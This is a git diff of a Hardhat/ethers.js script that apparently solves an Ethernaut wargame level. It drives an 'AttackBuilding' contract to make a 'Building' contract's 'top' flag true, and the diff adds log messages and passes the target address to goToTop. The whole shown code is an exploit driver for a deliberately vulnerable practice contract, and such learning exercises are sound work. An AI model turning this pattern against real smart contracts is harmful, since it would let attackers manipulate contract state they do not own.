@@ -3,7 +3,7 @@ import { ethers } from "hardhat";
 const attackBuilding = async () => {
     // change contract addresses here.
     const buildingAddress = "0x5d4D6D9b06CFb497D559355429AA7f9dd351AB62"; //type "await contract.address()" in ethernaut console
-    // AttackBuilding address = "0x44d67b486C68c1273871a5De10DD3fe2E8df4714";
+    // AttackBuilding address = " 0x853d1DDfF381089F6C479B76819B3C7d143D9544";
 
     // Don't touch below 🚀
     // Can alter last floor by using another contract
@@ -22,10 +22,12 @@ const attackBuilding = async () => {
     ];
     const attack = await ethers.getContract("AttackBuilding");
     const contract = await ethers.getContractAt(ABI, buildingAddress);
+    console.log("Making it possible to go to top floor...");
     const tx1 = await attack.isLastFloor();
     const tx1Receipt = await tx1.wait();
     console.log(tx1Receipt);
-    const tx2 = await attack.goToTop();
+    console.log("Going to the top floor...");
+    const tx2 = await attack.goToTop(buildingAddress);
     const tx2Receipt = await tx2.wait();
     console.log(tx2Receipt);
     const success = await contract.top();
